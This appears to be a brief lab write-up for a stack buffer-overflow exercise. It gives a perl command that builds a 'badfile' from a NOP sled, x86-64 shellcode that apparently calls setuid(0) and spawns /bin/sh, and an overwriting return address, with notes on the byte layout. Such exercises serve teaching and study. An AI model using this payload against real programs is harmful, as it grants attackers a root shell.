WE USED THE FOLLOWING COMMAND TO MAKE THE BADFILE:

perl -e 'print "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\x31\xc0\xb0\x69\x48\x31\xff\x0f\x05\x48\x31\xc0\xb0\x3b\x68\x2f\x62\x69\x6e\xbf\x2f\x73\x68\xaa\x81\xe7\xff\xff\xff\x55\x89\x7c\x24\x04\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05\x80\xdb\xff\xff\xff\x7f"' > badfile

*** WE USE 10 NOPS IN THE BEGINNING OF THE BADFILE SO AS NOT TO USE JUNK CODE (LIKE A's)
*** AFTER NOPS WE PUT THE OPCODES OF OUR SHELLCODE WHICH ARE 46 BYTES
*** AND WE FINISH WITH THE 6 BYTES OF THE ADDRESS WHERE OUR SHELLCODE BEGINS.
*** THUS: (10 BYTES NOPS) + (46 BYTES SHELLCODE) + (6 BYTES THE ADDRESS WHERE OUR SHELLCODE BEGINS) = 62 BYTES TOTAL

*** ALSO THE ADDRESS OF COURSE WILL BE DIFFERENT IN OTHER MACHINES
